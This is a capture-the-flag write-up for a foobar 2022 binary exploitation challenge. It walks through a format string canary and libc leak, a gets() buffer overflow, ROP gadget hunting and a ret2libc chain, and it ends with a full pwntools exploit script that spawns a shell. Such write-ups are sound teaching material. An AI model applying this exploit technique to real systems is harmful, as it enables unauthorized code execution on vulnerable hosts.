---
title:  "Pwning binaries and defeating modern mitigations using rop and ret2libc (foobar 2022 pwn writeup)"
layout: post
categories: ctf, binary exploits
---


In this article, i’ll explain and teach how to approach these kind of challenges, and how to defeat Stack canaries, ASLR, NX and PIE. Warmup pwn was a nice warm-up binary exploitation challenge from [foobar ctf 2022](https://foobar.nitdgplug.org/), had fun solving it!


![alt text](https://miro.medium.com/max/455/1*JxBCboNipG4Z-kia4xJfpA.png)
## Approaching the challenge
### In this challenge, we got 2 binaries: `chall, libc.so.6`

```sh
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
dynamically linked,for GNU/Linux 3.2.0, not stripped

Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

### View the decompiled code in Ghidra to get a general overview of the binary

```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  vuln();
  return 0;
}

void vuln(void)

{
  long in_FS_OFFSET;
  char canary_input [64];
  char buffer [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Can you help find the Canary ?");
  fgets(canary_input,0x40,stdin);
  printf(canary_input);
  fflush(stdout);
  gets(buffer);
  puts(buffer);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looks like we have a few vulnerabilities here, starting from **line 20**, containing a **format string vulnerability**, which can lead us into **reading registers and stack addresses, writing to known addresses, and reading strings from the binary**
> You still have to remember both `PIE` and `ASLR` are **enabled**, so we won’t be able to know the addresses of where we want to write to (they are randomized), lets stick with reading addresses for now.

Another vulnerable piece of code is on line 22 — gets function which can lead to buffer overflow, resulting in rewriting stack addresses and redirecting code flow.

```c
printf(canary_input); // Read values from stack and registers
gets(buffer); // overflow buffer and stack
```

**So how do we approach this challenge?** firstly, we need to set the **goal.** Doesn’t seem like the flag is loaded into memory or printed anywhere in the binary, so we would have to get a shell here.

The most straightforward way we have to redirect code execution is by **overwriting RIP**, the instruction pointer, to our **shellcode**, but you have to remember, the `NX bit` is **enabled, we can’t execute the stack.**

> This leads us to the ret2libc approach, we will redirect the code into a function in provided libc (system, preferably) to gain shell on the server.
{: .prompt-tip }

## Building the exploit

Firstly, to overwrite the instruction pointer, we have to defeat the **stack canary**, we can do that by leaking the value of the canary, then overwriting it with the correct value, right before overwriting the instruction pointer.

> You can also defeat canaries with bruteforce, refer to
[**here**](https://bananamafia.dev/post/binary-canary-bruteforce/)
{: .prompt-tip }

How can we leak the canary? well, viewing the code, its simply **stored on the stack**, we can use `printf` to print values from the **stack:**

![alt text](https://miro.medium.com/max/700/1*0GjkfvOsPsRtO9AJlqDGkg.png)

Breakpoint at the **stack canary check**, and compare the leaked stack values to the canary — now in rax.

> use “%z$llx” format to get the z’th param as a long long hex value
{: .prompt-tip }

Found the **canary** at the **23rd param**, nice! now we have to perform a **classic 64bit ret2libc.**

- Find the **offset** to the **canary**, and **rip**, (72 bytes to the canary, 8 more to rip)
- Using the same format string method, find leaks from libc, to get the offset set by ASLR, to get the address of system in the loaded libc.
- Using pwntools you can find the string **“/bin/sh”** in libc, to use in the call to system.
- in 64-bit, functions use **registers** to get their **arguments**, so there is no need to build a **stack frame** for system. so we also have to find a rop-gadget to load **“/bin/sh”** into **RDI Register.**

> Remember that you have to align the stack frame to 16 bits, we can do that by adding another ret gadget.
{: .prompt-danger }


### Collecting Gadgets
```sh
➜  warmup ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
0x0000000000023b72 : pop rdi ; ret
0x00000000001048ad : pop rdi ; retf
```


## Final exploit

```py
libc = ELF('libc.so.6', checksec=False)

io = start()

io.sendlineafter(b"?", b"%23$llx-%18$llx")
io.recvline()
data = io.recvline().strip().decode("utf-8").split('-')

cookie, stdout = data
cookie, stdout = int(cookie, 16), int(stdout, 16)

libc.address = stdout - libc.symbols['stdout'] + 232

padding = b"A" * 72
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
pop_rdi_ret = libc.address + 0x0000000000023b72

payload = [
    padding, cookie,
    b"A" * 8, pop_rdi_ret+1,
    pop_rdi_ret ,bin_sh,
    system, libc.symbols['exit'] 
]

io.sendline(flat(payload))

io.interactive()
```